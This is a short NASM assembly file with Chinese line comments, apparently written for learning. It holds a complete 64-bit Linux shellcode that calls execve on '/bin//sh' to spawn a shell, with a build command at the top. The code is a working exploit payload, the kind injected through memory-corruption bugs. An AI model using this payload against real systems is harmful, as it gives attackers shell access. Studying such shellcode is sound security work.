;; nasm -f bin shellcode.nasm -o shellcode.nasm.x86.flat

bits 64

shell:
    xor     esi, esi          ; 清零 rsi
    mul     esi               ; 清零 rax, rdx
    mov     al, 59            ; 设置 execve 系统调用号 (59)
    mov     rbx, '/bin//sh'   ; 将字符串常量存入 rbx
    push    rdx               ; 压栈 NULL (envp)
    push    rbx               ; 压栈 '/bin//sh'
    push    rsp               ; 压入栈顶指针
    pop     rdi               ; rdi = 指向 '/bin//sh' 的指针
    syscall                   ; 调用 execve
